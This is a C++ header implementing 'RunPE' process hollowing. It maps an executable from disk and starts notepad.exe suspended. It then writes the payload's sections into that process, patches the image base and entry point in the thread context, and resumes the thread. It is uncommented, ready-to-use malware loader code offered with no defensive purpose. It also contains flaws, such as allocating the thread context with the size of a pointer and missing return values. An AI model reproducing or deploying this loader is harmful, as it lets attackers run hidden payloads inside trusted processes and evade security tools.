#pragma once

#include <string>

#include <Windows.h>
#include <TlHelp32.h>
#include <fstream>

namespace RunPE
{
	class RunPE{
public:
	static HANDLE MapFileToMemory(LPCSTR filename)
	{
		std::streampos size;
		std::fstream file(filename, std::ios::in | std::ios::binary | std::ios::ate);
		if (file.is_open())
		{
			size = file.tellg();

			auto Memblock = new char[size]();

			file.seekg(0, std::ios::beg);
			file.read(Memblock, size);
			file.close();

			return Memblock;
		}
		return nullptr;
	}

	static int RunPortableExecutable(void* Image)
	{
		IMAGE_DOS_HEADER* DOSHeader;
		IMAGE_NT_HEADERS* NtHeader;
		IMAGE_SECTION_HEADER* SectionHeader;

		PROCESS_INFORMATION PI;
		STARTUPINFOA SI;

		CONTEXT* CTX;

		DWORD* ImageBase;
		void* pImageBase;

		int count;

		auto np = "C:\\WINDOWS\\SysWOW64\\notepad.exe";

		DOSHeader = static_cast<PIMAGE_DOS_HEADER>(Image);
		NtHeader = PIMAGE_NT_HEADERS(DWORD(Image) + DOSHeader->e_lfanew);

		if (NtHeader->Signature == IMAGE_NT_SIGNATURE)
		{
			ZeroMemory(&PI, sizeof(PI));
			ZeroMemory(&SI, sizeof(SI));

			if (CreateProcessA(np, nullptr, nullptr, nullptr, FALSE,
			                   CREATE_SUSPENDED, nullptr, nullptr, &SI, &PI))
			{
				CTX = static_cast<LPCONTEXT>(VirtualAlloc(NULL, sizeof(CTX), MEM_COMMIT, PAGE_READWRITE));
				CTX->ContextFlags = CONTEXT_FULL;

				if (GetThreadContext(PI.hThread, static_cast<LPCONTEXT>(CTX)))
				{
					ReadProcessMemory(PI.hProcess, LPCVOID(CTX->Ebx + 8), static_cast<LPVOID>(&ImageBase), 4, nullptr);

					pImageBase = VirtualAllocEx(PI.hProcess, LPVOID(NtHeader->OptionalHeader.ImageBase),
					                            NtHeader->OptionalHeader.SizeOfImage, 0x3000, PAGE_EXECUTE_READWRITE);

					WriteProcessMemory(PI.hProcess, pImageBase, Image, NtHeader->OptionalHeader.SizeOfHeaders, nullptr);

					for (count = 0; count < NtHeader->FileHeader.NumberOfSections; count++)
					{
						SectionHeader = PIMAGE_SECTION_HEADER(DWORD(Image) + DOSHeader->e_lfanew + 248 + (count * 40));

						WriteProcessMemory(PI.hProcess, LPVOID(DWORD(pImageBase) + SectionHeader->VirtualAddress),
						                   LPVOID(DWORD(Image) + SectionHeader->PointerToRawData),
						                   SectionHeader->SizeOfRawData, nullptr);
					}
					WriteProcessMemory(PI.hProcess, LPVOID(CTX->Ebx + 8),
					                   static_cast<LPVOID>(&NtHeader->OptionalHeader.ImageBase), 4, nullptr);

					CTX->Eax = DWORD(pImageBase) + NtHeader->OptionalHeader.AddressOfEntryPoint;
					SetThreadContext(PI.hThread, static_cast<LPCONTEXT>(CTX));
					ResumeThread(PI.hThread);

					return 0;
				}
			}
		}
	}
	};
}
